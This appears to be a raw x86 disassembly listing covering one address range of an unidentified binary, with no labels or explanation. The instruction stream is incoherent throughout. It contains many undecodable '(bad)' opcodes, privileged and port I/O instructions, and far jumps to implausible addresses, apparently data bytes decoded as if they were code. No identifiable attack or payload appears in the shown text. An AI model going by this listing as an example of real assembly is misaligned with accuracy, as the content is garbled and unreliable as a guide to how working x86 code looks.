  419fc2:	arpl   bp,dx
  419fc4:	mov    ecx,0x5951718a
  419fc9:	arpl   WORD PTR [esi-0x16],bx
  419fcc:	shl    BYTE PTR [esi-0x60bdd92b],1
  419fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fd3:	or     ah,BYTE PTR [esi-0x3a]
  419fd6:	in     eax,dx
  419fd7:	pop    ds
  419fd8:	(bad)  
  419fd9:	jno    0x41a014
  419fdb:	lods   al,BYTE PTR ds:[esi]
  419fdc:	sbb    ch,ah
  419fde:	ret    
  419fdf:	iret   
  419fe0:	lahf   
  419fe1:	stc    
  419fe2:	(bad)  
  419fe3:	inc    ebp
  419fe4:	sub    ecx,ebx
  419fe6:	adc    DWORD PTR [edx-0x6beec857],0x79
  419fed:	adc    al,0x2b
  419fef:	mov    ah,0xbf
  419ff1:	stc    
  419ff2:	dec    ecx
  419ff3:	(bad)  
  419ff4:	xor    DWORD PTR [ecx-0x48718e6a],ebx
  419ffa:	mov    BYTE PTR [edx],ah
  419ffc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ffd:	mov    edi,0x323cd976
  41a002:	in     eax,dx
  41a003:	jb     0x419fa4
  41a005:	outs   dx,BYTE PTR ds:[esi]
  41a006:	mov    BYTE PTR [edx],dh
  41a008:	aaa    
  41a009:	stos   DWORD PTR es:[edi],eax
  41a00a:	adc    eax,DWORD PTR [edx-0x43b3c2c]
  41a010:	int3   
  41a011:	sbb    dh,BYTE PTR [edi+eiz*4+0x7a]
  41a015:	mov    ch,0xfb
  41a017:	push   eax
  41a018:	sti    
  41a019:	int3   
  41a01a:	(bad)
  41a01e:	xor    eax,0x4ef19019
  41a023:	mov    bl,BYTE PTR [esi-0xf]
  41a026:	adc    DWORD PTR [ecx],esi
  41a028:	xor    al,0x7f
  41a02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a02b:	std    
  41a02c:	sbb    DWORD PTR [esi-0x35],0xffffffb1
  41a030:	xlat   BYTE PTR ds:[ebx]
  41a031:	arpl   WORD PTR [edx+edi*2],sp
  41a034:	stos   DWORD PTR es:[edi],eax
  41a035:	adc    eax,0x4343f441
  41a03a:	mov    ch,0x31
  41a03c:	lods   eax,DWORD PTR ds:[esi]
  41a03d:	pushf  
  41a03e:	or     esi,DWORD PTR [ecx+0x3]
  41a041:	aaa    
  41a042:	iret   
  41a043:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a044:	xor    DWORD PTR ds:[ebp+0x4837b769],0xa
  41a04c:	int    0xea
  41a04e:	pop    ebp
  41a04f:	mov    WORD PTR [ebx-0x69],gs
  41a052:	dec    eax
  41a053:	(bad)  
  41a054:	loope  0x419fd7
  41a056:	sub    BYTE PTR [esi-0x72],0x70
  41a05a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a05b:	loopne 0x41a001
  41a05d:	icebp  
  41a05e:	cmp    eax,0x639362d1
  41a063:	ror    BYTE PTR [ecx-0x14a4b1b1],1
  41a069:	dec    eax
  41a06a:	jmp    0x83b0:0x55182c50
  41a071:	clc    
  41a072:	arpl   WORD PTR [eax+0x1675a95],bx
  41a078:	xor    esp,DWORD PTR [edx]
  41a07a:	(bad)  
  41a07b:	out    0x18,al
  41a07d:	lods   al,BYTE PTR ds:[esi]
  41a07e:	fcomp  DWORD PTR [ebx]
  41a080:	in     eax,0x26
  41a082:	sbb    DWORD PTR [eax+0x34],0x8f3aea68
  41a089:	add    ebp,0x57
  41a08c:	rcl    BYTE PTR [ebx],cl
  41a08e:	mov    cl,0x74
  41a090:	push   esp
  41a091:	mov    ebp,DWORD PTR [edx+0x70]
  41a094:	jecxz  0x41a0d1
  41a096:	push   ebp
  41a097:	test   DWORD PTR [eax+eiz*1],ebx
  41a09a:	cmp    BYTE PTR ds:0x568812c3,bh
  41a0a0:	jnp    0x41a045
  41a0a2:	in     al,0xba
  41a0a4:	(bad)  
  41a0a5:	xor    al,0xdc
  41a0a7:	sahf   
  41a0a8:	aad    0xd5
  41a0aa:	cmp    eax,0x3dcd0691
  41a0af:	int3   
  41a0b0:	jb     0x41a099
  41a0b2:	nop
  41a0b3:	loop   0x41a09f
  41a0b5:	stos   DWORD PTR es:[edi],eax
  41a0b6:	js     0x41a0bb
  41a0b8:	mov    dh,0x72
  41a0ba:	jae    0x41a04d
  41a0bc:	dec    ebx
  41a0bd:	xor    eax,0x36547f78
  41a0c2:	sahf   
  41a0c3:	mov    ah,dh
  41a0c5:	sub    eax,DWORD PTR [ebp+0x43]
  41a0c8:	jns    0x41a0f1
  41a0ca:	cwde   
  41a0cb:	jle    0x41a0d5
  41a0cd:	jbe    0x41a12c
  41a0cf:	fsub   DWORD PTR [edi]
  41a0d1:	repnz rol BYTE PTR [edi],1
  41a0d4:	fstp   TBYTE PTR [ebp+0x7d9ca7da]
  41a0da:	adc    DWORD PTR es:[edx+0x55],ebx
  41a0de:	and    BYTE PTR [ebx+0x2be6a8d8],al
  41a0e4:	push   ss
  41a0e5:	outs   dx,BYTE PTR es:[esi]
  41a0e7:	jnp    0x41a121
  41a0e9:	jno    0x41a06b
  41a0eb:	mov    es,esp
  41a0ed:	mov    bh,0xf6
  41a0ef:	pop    edx
  41a0f0:	into   
  41a0f1:	sahf   
  41a0f2:	cld    
  41a0f3:	jl     0x41a0fc
  41a0f5:	fcmove st,st(0)
  41a0f7:	out    0x81,al
  41a0f9:	or     eax,0x34825af2
  41a0fe:	shl    DWORD PTR [ecx+edi*2+0x6b52d2e],0x24
  41a106:	cli    
  41a107:	or     DWORD PTR [edx-0x646ce480],0x7a014a7
  41a111:	jb     0x41a107
  41a113:	outs   dx,BYTE PTR ds:[esi]
  41a114:	mov    ch,0x93
  41a116:	push   0x5b099445
  41a11b:	add    BYTE PTR [edx-0x6097f115],bh
  41a121:	popa   
  41a122:	in     al,0xb2
  41a124:	jmp    0xe768:0xfa5262d4
  41a12b:	lahf   
  41a12c:	push   ebx
  41a12d:	jmp    0x41a0ff
  41a12f:	jp     0x41a0b1
  41a131:	pop    esi
  41a132:	daa    
  41a133:	push   es
  41a134:	(bad)
  41a137:	mov    dh,BYTE PTR [edi-0x20]
  41a13a:	(bad)  
  41a13b:	lods   al,BYTE PTR ds:[esi]
  41a13c:	inc    ebx
  41a13d:	int3   
  41a13e:	in     al,dx
  41a13f:	and    BYTE PTR [eax],bh
  41a141:	cmp    DWORD PTR [ecx+0x907a67],0xffffff9c
  41a148:	adc    eax,0xc745eb60
  41a14d:	imul   esi,DWORD PTR [esp+esi*4+0x6d],0xffffffce
  41a152:	cli    
  41a153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a154:	fucom  st(2)
  41a156:	xor    eax,0xd8c3343f
  41a15b:	inc    edx
  41a15c:	call   0x6aad6424
  41a161:	pop    edi
  41a162:	test   dh,cl
  41a164:	mov    ebp,0x8fd7028a
  41a169:	push   ecx
  41a16a:	bound  edx,QWORD PTR [esi]
  41a16c:	jp     0x41a19d
  41a16e:	ror    BYTE PTR [edi+0x35],0x48
  41a172:	sti    
  41a173:	add    ah,bl
  41a175:	inc    esi
  41a176:	sahf   
  41a177:	mov    bh,0xb8
  41a179:	dec    ebp
  41a17a:	push   0xdf9d574e
  41a17f:	imul   esp,DWORD PTR [eax],0xffffffd6
  41a182:	xchg   esi,eax
  41a183:	dec    eax
  41a184:	je     0x41a1a8
  41a186:	in     eax,dx
  41a187:	jecxz  0x41a1ff
  41a189:	sar    BYTE PTR [esi+0x7c7d796d],0x91
  41a190:	mov    ebx,0x1b62b8a6
  41a195:	mov    ebx,0x77ca2b6
  41a19a:	imul   ebp,DWORD PTR [ebx-0x22],0xd83de995
  41a1a1:	cmp    DWORD PTR [esi+edx*2+0x21],esi
  41a1a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1a6:	sbb    DWORD PTR [edi],eax
  41a1a8:	sbb    ebx,DWORD PTR [edx+0x39fb43fc]
  41a1ae:	ja     0x41a1ac
  41a1b0:	jae    0x41a143
  41a1b2:	pop    es
  41a1b3:	pop    ds
  41a1b4:	xchg   edi,eax
  41a1b5:	pop    esp
  41a1b6:	loopne 0x41a1fa
  41a1b8:	or     ebp,ebp
  41a1ba:	mov    edi,0xaa076e40
  41a1bf:	test   al,0xa7
  41a1c1:	or     DWORD PTR [eax-0x9],esp
  41a1c4:	imul   DWORD PTR [ebx-0x5edbffd4]
  41a1ca:	test   DWORD PTR [ebp+0x3c23dd07],ebx
  41a1d0:	(bad)  [edx+0x2b7ff730]
  41a1d6:	dec    ebp
  41a1d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a1d8:	sbb    eax,0xdce2e0c9
  41a1dd:	pushf  
  41a1de:	jnp    0x41a196
  41a1e0:	fnstcw WORD PTR [edx]
  41a1e2:	and    al,0x2a
  41a1e4:	jp     0x41a23b
  41a1e6:	fist   WORD PTR [esi]
  41a1e8:	mov    ds:0x4c8b80c4,eax
  41a1ed:	into   
  41a1ee:	cmc    
  41a1ef:	push   ebp
  41a1f0:	aaa    
  41a1f1:	fwait
  41a1f2:	jae    0x41a20b
  41a1f4:	adc    eax,0x7843a9e5
  41a1f9:	lea    eax,[edi-0x6a]
  41a1fc:	add    al,BYTE PTR [ebx-0x79364bcc]
  41a202:	pop    ecx
  41a203:	call   0x8357207f
  41a208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a209:	out    0x2d,eax
  41a20b:	dec    edi
  41a20c:	pop    ss
  41a20d:	imul   esi,DWORD PTR [ebx],0x7cda7798
  41a213:	push   edx
  41a214:	in     al,0x22
  41a216:	adc    eax,DWORD PTR ds:0x76362543
  41a21c:	fwait
  41a21d:	ins    BYTE PTR es:[edi],dx
  41a21e:	cmp    edx,0x835bc375
  41a224:	(bad)  
  41a225:	mov    dh,0x85
  41a227:	data16 test BYTE PTR [ebx],bl
  41a22a:	xchg   ebp,eax
  41a22b:	jl     0x41a24a
  41a22d:	jb     0x41a1dd
  41a22f:	cmp    esp,DWORD PTR [esi+0x77]
  41a232:	(bad)  
  41a233:	and    al,BYTE PTR [eax+0x74]
  41a236:	nop
  41a237:	push   edi
  41a238:	icebp  
  41a239:	test   BYTE PTR [eax+0x21aca5b3],0x38
  41a240:	int3   
  41a241:	push   ecx
  41a242:	stc    
  41a243:	nop
  41a244:	gs fucomi st,st(1)
  41a247:	pop    edi
  41a248:	stc    
  41a249:	ss jl  0x41a24a
  41a24c:	pop    eax
  41a24d:	clc    
  41a24e:	gs sub ebx,ecx
  41a251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a252:	push   esp
  41a253:	fnsave [eax-0x7]
  41a256:	call   0x5d68e8c7
  41a25b:	pop    edx
  41a25c:	(bad)  
  41a25d:	hlt    
  41a25e:	inc    edx
  41a25f:	jmp    0x35da:0x2b8ea461
  41a266:	out    0xa4,eax
  41a268:	mov    edi,0xb6ab78ac
  41a26d:	mov    edx,0x16d57c09
  41a272:	pop    edx
  41a273:	jnp    0x41a287
  41a275:	and    DWORD PTR [ebp+0x73],ebp
  41a278:	sub    eax,0x754518a9
  41a27d:	add    eax,0x2ca59491
  41a282:	jb     0x41a25d
  41a284:	mov    eax,0xe5f569fd
  41a289:	jne    0x41a275
  41a28b:	sub    ebp,edi
  41a28d:	es clc 
  41a28f:	sub    eax,0xb781c9a8
  41a294:	daa    
  41a295:	ins    BYTE PTR es:[edi],dx
  41a296:	mov    ecx,0x16e0ec6f
  41a29b:	xchg   ebp,eax
  41a29c:	pop    ss
  41a29d:	cmovae esp,DWORD PTR [ecx-0x64]
  41a2a1:	pop    eax
  41a2a2:	jns    0x41a319
  41a2a4:	pop    esp
  41a2a5:	(bad)  
  41a2a6:	int3   
  41a2a7:	sbb    eax,0xd15bd3fb
  41a2ac:	dec    esi
  41a2ad:	jbe    0x41a245
  41a2af:	xlat   BYTE PTR ds:[ebx]
  41a2b0:	inc    esi
  41a2b1:	pop    ebx
  41a2b2:	mov    ch,0xdd
  41a2b4:	jmp    0x9ee2:0xf70685e0
  41a2bb:	scas   al,BYTE PTR es:[edi]
  41a2bc:	xor    ch,BYTE PTR [ebx+0x70]
  41a2bf:	sub    DWORD PTR [eax+0x38629162],eax
  41a2c5:	test   DWORD PTR [eax+edi*2],esi
  41a2c8:	pop    edx
  41a2c9:	sub    DWORD PTR [edx-0x1b4aad2f],0x2f
  41a2d0:	or     ecx,DWORD PTR [esp+eax*4+0xb4b7b2]
  41a2d7:	dec    ebp
  41a2d8:	pop    edi
  41a2d9:	dec    ecx
  41a2da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2db:	sub    eax,0xf40aae25
  41a2e0:	and    ch,bh
  41a2e2:	(bad)  
  41a2e3:	loop   0x41a328
  41a2e5:	outs   dx,DWORD PTR ds:[esi]
  41a2e6:	or     eax,0x98fdb77e
  41a2eb:	mov    ebx,0x5301ab80
  41a2f0:	adc    BYTE PTR [ecx+0xc8a51b1],cl
  41a2f6:	and    eax,0xda96d334
  41a2fc:	aad    0x60
  41a2fe:	push   0xfb7a5e08
  41a303:	or     ch,BYTE PTR [eax-0x6b6d338d]
  41a309:	ins    BYTE PTR es:[edi],dx
  41a30a:	lea    esi,[esi-0x5572ade8]
  41a310:	into   
  41a311:	in     eax,dx
  41a312:	(bad)
  41a315:	rol    ah,cl
  41a317:	lods   al,BYTE PTR ds:[esi]
  41a318:	data16 mul BYTE PTR [esp+eiz*8]
  41a31c:	lock pop ss
  41a31e:	mov    cl,0xa2
  41a320:	push   sp
  41a322:	out    0x8b,eax
  41a324:	xlat   BYTE PTR ds:[ebx]
  41a325:	mov    ch,BYTE PTR es:[ebx+0x79358a9a]
  41a32c:	dec    ebp
  41a32d:	les    esi,FWORD PTR [eax-0x24]
  41a330:	dec    esp
  41a331:	xchg   ebx,eax
  41a332:	sbb    eax,0x5d915657
  41a337:	mov    BYTE PTR [eax],0x52
  41a33a:	test   al,0x35
  41a33c:	inc    ecx
  41a33d:	adc    dh,BYTE PTR [ecx+0x3c786463]
  41a343:	aaa    
  41a344:	cmc    
  41a345:	(bad)  
  41a346:	hlt    
  41a347:	push   eax
  41a348:	fistp  DWORD PTR [ebx-0x54]
  41a34b:	sub    edx,DWORD PTR [edi-0x4c5ce322]
  41a351:	jp     0x41a31e
  41a353:	dec    edi
  41a354:	inc    ebx
  41a355:	mov    ds:0x971aecbc,al
  41a35a:	shl    BYTE PTR [ebx+edx*4],0xe4
  41a35e:	push   esi
  41a35f:	push   edi
  41a360:	je     0x41a319
  41a362:	outs   dx,BYTE PTR ds:[esi]
  41a363:	fdivp  st(2),st
  41a365:	mov    WORD PTR [ebx+0x1c124781],es
  41a36b:	shl    DWORD PTR [esi-0x71de55b1],cl
  41a371:	mov    cl,0xe5
  41a373:	cdq    
  41a374:	jnp    0x41a329
  41a376:	mov    ah,0xb2
  41a378:	and    BYTE PTR [edi],0x79
  41a37b:	jbe    0x41a361
  41a37d:	sar    ebx,cl
  41a37f:	add    eax,0x3789a56d
  41a384:	mov    al,0xc0
  41a386:	or     eax,0xff0a279
  41a38b:	jle    0x41a326
  41a38d:	stos   DWORD PTR es:[edi],eax
  41a38e:	int3   
  41a38f:	stc    
  41a390:	lds    eax,FWORD PTR [eax+0x15b89a3d]
  41a396:	xchg   esp,eax
  41a397:	xor    eax,0x9eb78b9d
  41a39c:	push   cs
  41a39d:	test   BYTE PTR [ebx+edi*8+0x6dd88f68],al
  41a3a4:	cmp    BYTE PTR [edi+0x7d7a5c20],al
  41a3aa:	stos   BYTE PTR es:[edi],al
  41a3ab:	sbb    eax,0x26a1bc9
  41a3b0:	sub    ah,al
  41a3b2:	pop    ds
  41a3b3:	xchg   esp,eax
  41a3b4:	dec    ebx
  41a3b5:	mul    DWORD PTR [ebx-0x49]
  41a3b8:	stc    
  41a3b9:	bound  ecx,QWORD PTR [ecx+0x54]
  41a3bc:	mov    dh,0xec
  41a3be:	cmp    al,0x3a
  41a3c0:	or     ebp,esi
  41a3c2:	adc    BYTE PTR [ecx+0x1c199d62],cl
  41a3c8:	or     eax,0x5f9e53af
  41a3cd:	dec    ebx
  41a3ce:	cmp    eax,0xe712a94f
  41a3d3:	sbb    BYTE PTR [esi],0xa5
  41a3d6:	test   DWORD PTR [ebx],edi
  41a3d8:	lds    esi,FWORD PTR [esi]
  41a3da:	fwait
  41a3db:	dec    ebx
  41a3dc:	push   esi
  41a3dd:	aam    0x79
  41a3df:	bound  esi,QWORD PTR [ecx+0x13cb7864]
  41a3e5:	bound  ecx,QWORD PTR [ebx-0x6e1baba]
  41a3eb:	scas   al,BYTE PTR es:[edi]
  41a3ec:	add    al,0x6f
  41a3ee:	cli    
  41a3ef:	lds    esp,FWORD PTR [edx*8-0x63c009cf]
  41a3f6:	fs sbb eax,0xd2304dc3
  41a3fc:	jg     0x41a45b
  41a3fe:	add    eax,0x4a28d764
  41a403:	push   cs
  41a404:	xor    al,0xe5
  41a406:	sbb    al,0x60
  41a408:	cmp    BYTE PTR [esp+ecx*1+0x43012053],dh
  41a40f:	add    ah,BYTE PTR [edx]
  41a411:	pop    ecx
  41a412:	mov    cl,0xfc
  41a414:	xor    edi,DWORD PTR [ebx+0x5d]
  41a417:	xor    bh,0xec
  41a41a:	dec    ecx
  41a41b:	in     al,dx
  41a41c:	cmp    al,0x7
  41a41e:	pusha  
  41a41f:	dec    ebx
  41a420:	es jmp 0x34e99fd8
  41a426:	shr    BYTE PTR ds:0x412d1042,cl
  41a42c:	xchg   al,ch
  41a42e:	ins    DWORD PTR es:[edi],dx
  41a42f:	sbb    edx,DWORD PTR [edx+0x6940a6f2]
  41a435:	(bad)  
  41a436:	lock push ss
  41a438:	out    0xcd,al
  41a43a:	pusha  
  41a43b:	(bad)  
  41a43c:	push   ecx
  41a43d:	and    al,0x25
  41a43f:	aad    0x66
  41a441:	pop    ss
  41a442:	leave  
  41a443:	mov    bl,0x23
  41a445:	sub    edx,DWORD PTR [ebp+0x4e37d763]
  41a44b:	out    dx,al
  41a44c:	retf   0xe8e7
  41a44f:	hlt    
  41a450:	jns    0x41a3e3
  41a452:	fdiv   QWORD PTR [esi-0x369cd514]
  41a458:	jnp    0x41a479
  41a45a:	pop    ebp
  41a45b:	repnz add al,0x6b
  41a45f:	xor    al,0xfb
  41a461:	xor    al,0x72
  41a463:	imul   esp,DWORD PTR [ebx],0x2f
  41a466:	pop    ebp
  41a467:	cmp    al,0xf3
  41a469:	rol    BYTE PTR [ecx+0x6ec4f031],0xaf
  41a470:	retf   
  41a471:	and    DWORD PTR [eax+0xf],esp
  41a474:	dec    ebx
  41a475:	std    
  41a476:	push   esp
  41a477:	(bad)  
  41a478:	pop    ebp
  41a479:	les    edi,FWORD PTR [edi]
  41a47b:	ret    
  41a47c:	inc    ecx
  41a47d:	std    
  41a47e:	bound  ebp,QWORD PTR [esi+0x16]
  41a481:	sbb    cl,0xe1
  41a484:	out    dx,eax
  41a485:	push   0x63bcc75a
  41a48a:	test   DWORD PTR [ecx-0x4e995542],esi
  41a490:	std    
  41a491:	jae    0x41a449
  41a493:	add    bh,cl
  41a495:	mov    ah,0x61
  41a497:	pop    esi
  41a498:	stos   BYTE PTR es:[edi],al
  41a499:	push   esp
  41a49a:	adc    BYTE PTR [ecx+0x11eb0e31],bh
  41a4a0:	and    edi,DWORD PTR [ebp+eiz*4+0x6b90d767]
  41a4a7:	popf   
  41a4a8:	or     al,0x33
  41a4aa:	dec    ebx
  41a4ab:	adc    ecx,DWORD PTR [esi-0x7]
  41a4ae:	xchg   ebx,eax
  41a4af:	sub    edi,DWORD PTR [ebx]
  41a4b1:	sbb    eax,0xe176c287
  41a4b6:	pop    esi
  41a4b7:	nop
  41a4b8:	cmp    al,0x7f
  41a4ba:	retf   
  41a4bb:	data16 jl 0x41a4a1
  41a4be:	sub    bh,BYTE PTR [eax]
  41a4c0:	cmp    al,0x2
  41a4c2:	scas   al,BYTE PTR es:[edi]
  41a4c3:	xchg   DWORD PTR fs:[ecx],ecx
  41a4c6:	das    
  41a4c7:	mov    esp,fs
  41a4c9:	pop    ebp
  41a4ca:	ins    BYTE PTR es:[edi],dx
  41a4cb:	pop    ecx
  41a4cc:	adc    al,0x17
  41a4ce:	int    0x94
  41a4d0:	jmp    0x6d73:0x82cbf632
  41a4d7:	lods   al,BYTE PTR ds:[esi]
  41a4d8:	ds xor al,0x92
  41a4db:	or     BYTE PTR [ecx],0x7d
  41a4de:	mov    edx,0xf7b94c60
  41a4e3:	push   edx
  41a4e4:	stos   DWORD PTR es:[edi],eax
  41a4e5:	mov    WORD PTR [edi+ebp*4+0x71770fd3],ds
  41a4ec:	inc    DWORD PTR [ebx+0x1b551c6b]
  41a4f2:	pop    edi
  41a4f3:	daa    
  41a4f4:	pushf  
  41a4f5:	fcom   QWORD PTR ds:0x85664004
  41a4fb:	sbb    ebx,0xe7ce0d42
  41a501:	xchg   esi,eax
  41a502:	shl    DWORD PTR [ebp+0x5b9bdf4e],1
  41a508:	add    dl,BYTE PTR [edx]
  41a50a:	dec    ecx
  41a50b:	push   es
  41a50c:	test   BYTE PTR [edi-0x5e010599],bh
  41a512:	ror    BYTE PTR [ebx+0x4559aa88],1
  41a518:	dec    ebx
  41a519:	test   DWORD PTR es:[eax-0x39e81532],0xc62ab26b
  41a524:	fs loop 0x41a509
  41a527:	dec    ebp
  41a528:	add    al,0xa1
  41a52a:	pop    edi
  41a52b:	leave  
  41a52c:	cmp    eax,0x2655f80b
  41a531:	stc    
  41a532:	jns    0x41a598
  41a534:	pop    ebp
  41a535:	call   0xa0d7:0x9b5910d0
  41a53c:	adc    al,0xef
  41a53e:	mov    bh,BYTE PTR [ecx-0x5145fe55]
  41a544:	scas   eax,DWORD PTR es:[edi]
  41a545:	call   0xd15d9989
  41a54a:	mov    dh,0xb7
  41a54c:	iret   
  41a54d:	mov    dl,0xa0
  41a54f:	sub    eax,0x2740484b
  41a554:	inc    ebp
  41a555:	pop    ebx
  41a556:	out    dx,al
  41a557:	shl    DWORD PTR [edi+0x18],0x98
  41a55b:	lea    ebx,[esi]
  41a55d:	push   ebp
  41a55e:	jecxz  0x41a500
  41a560:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a561:	fucomip st,st(3)
  41a563:	pop    esp
  41a564:	xchg   ebx,eax
  41a565:	in     al,0x49
  41a567:	or     ebp,DWORD PTR [edi]
  41a569:	xchg   ecx,eax
  41a56a:	pop    esp
  41a56b:	outs   dx,BYTE PTR ds:[esi]
  41a56c:	inc    edx
  41a56d:	xchg   esi,eax
  41a56e:	(bad)  
  41a56f:	(bad)  
  41a570:	cmc    
  41a571:	out    dx,eax
  41a572:	test   DWORD PTR [eax-0x78],edi
  41a575:	xchg   edi,eax
  41a576:	stc    
  41a577:	out    dx,eax
  41a578:	(bad)  
  41a579:	fimul  WORD PTR [edx+0x7]
  41a57c:	enter  0xa450,0xa1
  41a580:	cmp    cl,0xc4
  41a583:	dec    edi
  41a584:	cmp    cl,al
  41a586:	xchg   ebp,eax
  41a587:	sub    al,bh
  41a589:	lds    ebp,FWORD PTR [edx]
  41a58b:	pop    ds
  41a58c:	and    eax,0x1905149c
  41a591:	call   0x3168edef
  41a596:	sahf   
  41a597:	ror    BYTE PTR [edx],cl
  41a599:	hlt    
  41a59a:	shl    DWORD PTR [edi+esi*8-0x60fc0b6e],1
  41a5a1:	in     al,0xe0
  41a5a3:	and    al,0x92
  41a5a5:	ins    DWORD PTR es:[edi],dx
  41a5a6:	push   eax
  41a5a7:	xor    edx,esp
  41a5a9:	push   es
  41a5aa:	mov    ch,0xd
  41a5ac:	inc    eax
  41a5ad:	xor    bh,ch
  41a5af:	mov    cl,0xc2
  41a5b1:	xchg   edi,eax
  41a5b2:	jmp    0x21e5:0xcb5c6f77
  41a5b9:	adc    eax,0xc464fbf1
  41a5be:	jmp    0xfca2590d
  41a5c3:	repz dec ebx
  41a5c5:	mov    ebp,0xcd90fc8d
  41a5ca:	and    al,BYTE PTR [esi]
  41a5cc:	pop    ds
  41a5cd:	pop    ecx
  41a5ce:	sbb    ebp,DWORD PTR [eax]
  41a5d0:	and    eax,0x8bca13a3
  41a5d5:	xchg   ebx,eax
  41a5d6:	into   
  41a5d7:	imul   esi,DWORD PTR [esi+0x6610ce24],0xda9ebdcf
  41a5e1:	add    al,BYTE PTR [ebx]
  41a5e3:	scas   eax,DWORD PTR es:[edi]
  41a5e4:	pop    ss
  41a5e5:	xchg   edi,eax
  41a5e6:	mov    al,ds:0xb72d754
  41a5eb:	mov    eax,ds:0x4cb6b9da
  41a5f0:	ret    0x6413
  41a5f3:	fcomp  DWORD PTR [edi-0x4]
  41a5f6:	or     bl,BYTE PTR [edi+0x2c50bc71]
  41a5fc:	clc    
  41a5fd:	icebp  
  41a5fe:	cmp    BYTE PTR [ebp+0x49],dh
  41a601:	mov    al,0x20
  41a603:	jne    0x41a5a2
  41a605:	xor    DWORD PTR [eax-0x42b63a63],ebx
  41a60b:	(bad)  
  41a60c:	(bad)  
  41a60d:	sbb    eax,0x5d29e9ae
  41a612:	dec    ecx
  41a613:	iret   
  41a614:	pop    ss
  41a615:	lock fwait
  41a617:	stc    
  41a618:	pop    es
  41a619:	outs   dx,DWORD PTR ds:[esi]
  41a61a:	ss repz mov edi,0x60e20890
  41a621:	jno    0x41a5e8
  41a623:	in     al,0x13
  41a625:	or     BYTE PTR [ebx-0x6],ch
  41a628:	outs   dx,DWORD PTR ds:[esi]
  41a629:	jg     0x41a66a
  41a62b:	pop    esi
  41a62c:	add    bh,BYTE PTR [eax+eax*1+0x76]
  41a630:	fldcw  WORD PTR ds:0x5638cdc0
  41a636:	adc    al,0x5c
  41a638:	sbb    al,0xe8
  41a63a:	dec    ecx
  41a63b:	sub    eax,0x6523cd8
  41a640:	jecxz  0x41a669
  41a642:	push   esi
  41a643:	stos   DWORD PTR es:[edi],eax
  41a644:	stos   BYTE PTR es:[edi],al
  41a645:	or     ebx,DWORD PTR [esi]
  41a647:	sti    
  41a648:	nop
  41a649:	lea    edx,[esi+ecx*1]
  41a64c:	in     eax,dx
  41a64d:	jb     0x41a691
  41a64f:	(bad)  
  41a650:	xor    al,0x8d
  41a652:	push   DWORD PTR [ebx]
  41a654:	or     eax,0x5ada4608
  41a659:	ss mov dl,0x83
  41a65c:	call   0x1a3df988
  41a661:	inc    ebx
  41a662:	xchg   esi,eax
  41a663:	fild   QWORD PTR [esp+ebx*4-0x27]
  41a667:	mov    bl,0x50
  41a669:	mov    dh,0x85
  41a66b:	jg     0x41a670
  41a66d:	mul    DWORD PTR [ebx-0x6b2b6ce9]
  41a673:	push   0xebf4a57a
  41a678:	mov    ds:0x371eb97e,eax
  41a67d:	mov    dh,0x68
  41a67f:	push   ebp
  41a680:	in     eax,dx
  41a681:	stos   DWORD PTR es:[edi],eax
  41a682:	arpl   bx,bx
  41a684:	cwde   
  41a685:	(bad)  [ebp-0x3b]
  41a688:	dec    esi
  41a689:	mov    ecx,0xc5ffe066
  41a68e:	scas   al,BYTE PTR es:[edi]
  41a68f:	inc    edx
  41a690:	jne    0x41a6ce
  41a692:	fimul  DWORD PTR [eax]
  41a694:	adc    ecx,DWORD PTR [ecx+eiz*1+0x7ef43945]
  41a69b:	scas   eax,DWORD PTR es:[edi]
  41a69c:	stos   DWORD PTR es:[edi],eax
  41a69d:	mov    ch,0xe8
  41a69f:	sbb    bl,BYTE PTR [edi+0x2fc4a6f]
  41a6a5:	js     0x41a6e8
  41a6a7:	in     al,dx
  41a6a8:	cmp    al,al
  41a6aa:	push   0xffffffa4
  41a6ac:	(bad)  
  41a6ad:	into   
  41a6ae:	loopne 0x41a715
  41a6b0:	jns    0x41a6a8
  41a6b2:	aaa    
  41a6b3:	les    esp,FWORD PTR [eax]
  41a6b5:	add    BYTE PTR [edi-0x61583dbb],ch
  41a6bb:	or     esp,DWORD PTR [esi+ecx*8]
  41a6be:	jg     0x41a6c5
  41a6c0:	pushf  
  41a6c1:	jb     0x41a6f4
  41a6c3:	aam    0x48
  41a6c5:	adc    dl,0x7f
  41a6c8:	out    dx,eax
  41a6c9:	push   ebx
  41a6ca:	fstp   DWORD PTR [esi+edi*4]
  41a6cd:	sub    DWORD PTR [ecx+0x5d9ff189],ebx
  41a6d3:	inc    edx
  41a6d4:	add    BYTE PTR [ecx+0x5341df48],al
  41a6da:	mov    cl,dh
  41a6dc:	stc    
  41a6dd:	popa   
  41a6de:	fs xchg esp,eax
  41a6e0:	mov    esi,ecx
  41a6e2:	sar    DWORD PTR [edx-0xb8b7a99],1
  41a6e8:	inc    ebx
  41a6e9:	out    dx,eax
  41a6ea:	cdq    
  41a6eb:	sar    BYTE PTR [edx+esi*1],cl
  41a6ee:	adc    esi,DWORD PTR [edi+0x3c]
  41a6f1:	ins    DWORD PTR es:[edi],dx
  41a6f2:	mov    al,ds:0x9d041986
  41a6f7:	ins    BYTE PTR es:[edi],dx
  41a6f8:	fnstcw WORD PTR [eax+esi*4-0x38897aa]
  41a6ff:	dec    ebp
  41a700:	pop    es
  41a701:	(bad)  
  41a702:	fwait
  41a703:	xchg   edi,eax
  41a704:	popf   
  41a705:	cld    
  41a706:	add    bh,ch
  41a708:	rcr    ebp,0x1
  41a70b:	fidivr DWORD PTR [eax+0x40a817ed]
  41a711:	cmp    BYTE PTR [ebp+0x62],dh
  41a714:	lds    esi,FWORD PTR [ebx]
  41a716:	mov    al,0x70
  41a718:	jne    0x41a761
  41a71a:	cmp    BYTE PTR ds:0xe17292e6,bl
  41a720:	inc    eax
  41a721:	xor    eax,0xb7f7350a
  41a726:	lea    eax,[eax]
  41a728:	or     dh,BYTE PTR [edi+0x43]
  41a72b:	inc    ebp
